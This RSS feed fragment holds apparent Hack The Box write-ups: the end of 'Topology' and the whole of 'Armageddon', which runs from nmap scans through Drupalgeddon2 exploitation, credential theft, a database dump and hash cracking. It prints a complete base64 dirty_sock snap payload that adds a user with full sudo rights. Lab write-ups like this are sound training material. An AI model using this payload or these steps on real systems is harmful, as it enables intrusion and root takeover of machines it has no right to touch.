        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Using the cracked password we find, we&amp;rsquo;re able to ssh into the machine.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/ssh_topology.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;SSH-In&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;h3 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
&lt;span&gt;
    &lt;a href=&#34;#privilege-escalation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Root is pretty straight forward, there&amp;rsquo;s a setuid binary (bash)
we could use to gain root privileges and read the root flag.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_root.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Becoming Root&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>HTB - Armageddon</title>
      <link>https://ybenel.cf/post/htb-armageddon/</link>
      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ybenel.cf/post/htb-armageddon/</guid>
      <description>&lt;p&gt;Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).&lt;/p&gt;
&lt;h2 id=&#34;enumeration&#34; &gt;Enumeration
&lt;span&gt;
    &lt;a href=&#34;#enumeration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;We start of with an intense full port scan with nmap.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Increasing send delay &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; 10.129.100.170 from &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;0&lt;/span&gt; to &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;5&lt;/span&gt; due to &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;55&lt;/span&gt; out of &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;183&lt;/span&gt; dropped probes since last increase.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: 10.129.100.170 giving up on port because retransmission cap hit (10).
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Increasing send delay &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; 10.129.100.170 from &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;640&lt;/span&gt; to &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;1000&lt;/span&gt; due to &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;110&lt;/span&gt; out of &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;366&lt;/span&gt; dropped probes since last increase.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; armageddon.htb (10.129.100.170)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up (0.098s latency).
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;40576&lt;/span&gt; closed ports, &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;24958&lt;/span&gt; filtered ports
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Then we run another nmap scan to identify what version/service ports are running on.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; armageddon.htb (10.129.100.170)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up (0.070s latency).
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-generator: Drupal &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;7&lt;/span&gt; (http://drupal.org)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-robots.txt: &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;36&lt;/span&gt; disallowed entries (&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;15&lt;/span&gt; shown)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /includes/ /misc/ /modules/ /profiles/ /scripts/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_/LICENSE.txt /MAINTAINERS.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Welcome to  Armageddon |  Armageddon
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE&amp;rsquo;s Exploits .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/exploits.png&#34; alt=&#34;searchsploit_exploits&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;foothold&#34; &gt;Foothold
&lt;span&gt;
    &lt;a href=&#34;#foothold&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Checking Exploits that &lt;strong&gt;searchploit&lt;/strong&gt; showed and from the name of the box it looks like the drupal installation is highly vulnerable to Drupalgeddon2/3 , further tho running &lt;strong&gt;Metasploit&lt;/strong&gt; to launch the exploit.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/metasploit1.png&#34; alt=&#34;metasploit1&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;After Few Moments.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/msf_worked.png&#34; alt=&#34;msf_worked1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;user-enumeration&#34; &gt;User Enumeration
&lt;span&gt;
    &lt;a href=&#34;#user-enumeration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;After Getting A foothold on the machine i tried spawning another shell to get a full tty shell ,however the following error is giving .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/no_tty.png&#34; alt=&#34;no_revshell&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This concludes that the there&amp;rsquo;s some sort of firewall blocking it or there&amp;rsquo;s restrictions that don&amp;rsquo;t allow such outcoming connections like sandboxed programs in this case apache?.&lt;/li&gt;
&lt;li&gt;However there&amp;rsquo;s an allowed connection at port 4444&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/rev_shell.png&#34; alt=&#34;rev_shell&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Yet trying to spawn a tty results into another issue which confirms this a sandboxed environment .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/sandboxed.png&#34; alt=&#34;sandboxed_box&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s get &lt;strong&gt;linpeas&lt;/strong&gt; and run it, PS: Since this is a restricted environment we cannot make files executable or get them with any port unless 80.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/linpeas.png&#34; alt=&#34;linpeas_start&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linpeas did find drupal Mysql password&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/linpeas2.png&#34; alt=&#34;finding_mysql_creds&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Let&amp;rsquo;s check the full file [/var/www/html/sites/default/settings.php] for mysql username And Password.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/creds_mysql.png&#34; alt=&#34;creds_mysql&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sweet , now let&amp;rsquo;s connect to mysql and dump what juicy stuff it holds .&lt;/li&gt;
&lt;li&gt;Reminder, I had issues connecting to mysql directly with mysql client however i did a betterway to get the content of mysql database through mysqldump.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/mysql_dump.png&#34; alt=&#34;mysql_dump&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;now i can just download it and cat it or import it to my own mysql server.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/dump_view.png&#34; alt=&#34;dump_view&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;we can see that&amp;rsquo;s there&amp;rsquo;s the user &lt;strong&gt;brucetherealadmin&lt;/strong&gt; which is a local user , let&amp;rsquo;s crack its hash and try to ssh with it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/crack_hash.png&#34; alt=&#34;brute_pass_crack&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Great it&amp;rsquo;s cracked , Now let&amp;rsquo;s try to ssh into &lt;strong&gt;Bruce&lt;/strong&gt; and read the &lt;strong&gt;user.txt&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/get_user.png&#34; alt=&#34;get_user&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
&lt;span&gt;
    &lt;a href=&#34;#privilege-escalation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;initial-recon&#34; &gt;Initial Recon
&lt;span&gt;
    &lt;a href=&#34;#initial-recon&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;After we got into user &lt;strong&gt;bruce&lt;/strong&gt; let&amp;rsquo;s see if he has any sudo permissions,terms whatever .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/sudo_int.png&#34; alt=&#34;sudo_terms&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Looks like he (&lt;strong&gt;bruce&lt;/strong&gt;) can install snap packages , This is really interesting .&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Let&amp;rsquo;s create a crafted snap package and install it simply it will be just a setuid binary packaged in snap that will get us root , otherway is by overwritten the content of /etc/passwd by adding a root user to it that will can ssh to &amp;hellip;. , there&amp;rsquo;s alot of way tho.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;There&amp;rsquo;s few exploits that were made for snapd that allowed installation of malicious crafted snaps , however we don&amp;rsquo;t need to run those exploits because this version of snap is patched and we have root privileges to install any snap package.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;So In Order To Create a snap package i had to install an ubuntu vm cuz i&amp;rsquo;m running arch based os, so i cheated a bit and i didn&amp;rsquo;t want to run a vm so i used a prepacked snaps from those exploits &lt;a href=&#34;https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;i decoded the base64 and wrote it to a file using python&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;import&lt;/span&gt; base64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload = (&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt; + &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; * &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;4256&lt;/span&gt; + &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;==&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d = base64.b64decode(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;crafted.snap&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;).write(d)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Then downloaded the file and installed it .&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/inst_run.png&#34; alt=&#34;inst_run&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Now let&amp;rsquo;s su to the dirty_sock user we added to /etc/passwd and read the root flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/read_root.png&#34; alt=&#34;read_root&#34;&gt;&lt;/p&gt;
&lt;p&gt;And That&amp;rsquo;s it , that&amp;rsquo;s &lt;strong&gt;Armageddon&lt;/strong&gt; hope you enjoyed the writeup take care and i&amp;rsquo;ll see you all other time.&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>
